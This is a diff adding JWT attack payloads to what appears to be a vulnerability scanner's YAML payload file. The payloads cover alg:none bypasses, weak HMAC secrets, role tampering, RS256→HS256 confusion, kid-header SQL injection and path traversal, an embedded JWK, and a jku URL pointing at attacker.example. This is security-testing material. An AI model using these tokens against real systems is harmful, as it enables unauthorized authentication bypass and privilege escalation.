@@ -4,7 +4,13 @@ context:
   technologies: ["JWT"]
   headers: ["Authorization: Bearer eyJ"]
 
+# Sprint 76 Phase 3 — JWT confusion + algorithm switch.
+# Sets vuln_class: jwt_confusion on every payload so the Cybrium
+# platform groups + filters by class. Non-intrusive (read-only
+# replay); no operator attestation required.
+
 payloads:
+  # ── alg=none — the canonical JWT bypass ─────────────────────────────────
   - value: "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImN5d2ViIiwiYWRtaW4iOnRydWV9."
     detect: { status_change: true }
     id: jwt-none-01
@@ -14,7 +20,23 @@ payloads:
     inject_as: header
     header_name: Authorization
     header_prefix: "Bearer "
+    vuln_class: jwt_confusion
 
+  # Same as above with the upper-cased "None" — some libraries split
+  # case-insensitive on the alg value but case-sensitive on the parsed
+  # type (e.g. older PyJWT < 2.4).
+  - value: "eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImN5d2ViIiwiYWRtaW4iOnRydWV9."
+    detect: { status_change: true }
+    id: jwt-none-case-01
+    title: "JWT — alg:NONE (case variant) signature bypass"
+    severity: critical
+    cwe: CWE-347
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+    vuln_class: jwt_confusion
+
+  # ── Weak HMAC secret — common signing keys ──────────────────────────────
   - value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImN5d2ViIiwiYWRtaW4iOnRydWV9.dummysig"
     detect: { status_change: true }
     id: jwt-weak-01
@@ -24,7 +46,9 @@ payloads:
     inject_as: header
     header_name: Authorization
     header_prefix: "Bearer "
+    vuln_class: jwt_confusion
 
+  # ── Role escalation via payload tamper ──────────────────────────────────
   - value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIn0.dummysig"
     detect: { status_change: true }
     id: jwt-role-01
@@ -34,3 +58,75 @@ payloads:
     inject_as: header
     header_name: Authorization
     header_prefix: "Bearer "
+    vuln_class: jwt_confusion
+
+  # ── Algorithm confusion — RS256 → HS256 ─────────────────────────────────
+  # Server expects RS256 (verify with public key) but accepts HS256
+  # (verify the same key as a shared secret). Send a token signed with
+  # HS256 using a placeholder secret — server-side weakness shows as
+  # 200/auth-OK against an endpoint that should require auth.
+  - value: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImN5d2ViIiwiYWRtaW4iOnRydWV9.cHVibGljLWtleS1hcy1zZWNyZXQ"
+    detect: { status_change: true }
+    id: jwt-alg-confuse-01
+    title: "JWT — RS256→HS256 algorithm confusion"
+    severity: critical
+    cwe: CWE-347
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+    vuln_class: jwt_confusion
+
+  # ── kid header SQLi ─────────────────────────────────────────────────────
+  # Header: {"alg":"HS256","kid":"x' UNION SELECT 'AA' --"} encoded.
+  # Server uses kid as a SQL parameter to look up the signing key;
+  # successful SQLi returns a key the attacker controls.
+  - value: "eyJhbGciOiJIUzI1NiIsImtpZCI6IngnIFVOSU9OIFNFTEVDVCAnQUEnIC0tIn0.eyJzdWIiOiJhZG1pbiJ9.AA"
+    detect: { status_change: true }
+    id: jwt-kid-sqli-01
+    title: "JWT — kid header SQL injection"
+    severity: critical
+    cwe: CWE-89
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+    vuln_class: jwt_confusion
+
+  # ── kid header path traversal ───────────────────────────────────────────
+  # Server resolves kid against the filesystem; traversal points at
+  # /dev/null (signs with empty content), letting us mint valid tokens.
+  - value: "eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbiJ9.AA"
+    detect: { status_change: true }
+    id: jwt-kid-traversal-01
+    title: "JWT — kid header path traversal"
+    severity: high
+    cwe: CWE-22
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+    vuln_class: jwt_confusion
+
+  # ── Embedded JWK — token brings its own public key ──────────────────────
+  # Header includes `jwk` pointing at an attacker-controlled key;
+  # libraries that trust the embedded JWK without whitelisting accept it.
+  - value: "eyJhbGciOiJSUzI1NiIsImp3ayI6eyJrdHkiOiJSU0EiLCJlIjoiQVFBQiIsIm4iOiJBQSJ9fQ.eyJzdWIiOiJhZG1pbiJ9.AA"
+    detect: { status_change: true }
+    id: jwt-embedded-jwk-01
+    title: "JWT — embedded JWK signature trust"
+    severity: critical
+    cwe: CWE-345
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+    vuln_class: jwt_confusion
+
+  # ── jku header pointing at attacker-controlled URL ──────────────────────
+  - value: "eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS9qd2tzLmpzb24ifQ.eyJzdWIiOiJhZG1pbiJ9.AA"
+    detect: { status_change: true }
+    id: jwt-jku-01
+    title: "JWT — jku header attacker-controlled JWKS URL"
+    severity: critical
+    cwe: CWE-918
+    inject_as: header
+    header_name: Authorization
+    header_prefix: "Bearer "
+    vuln_class: jwt_confusion
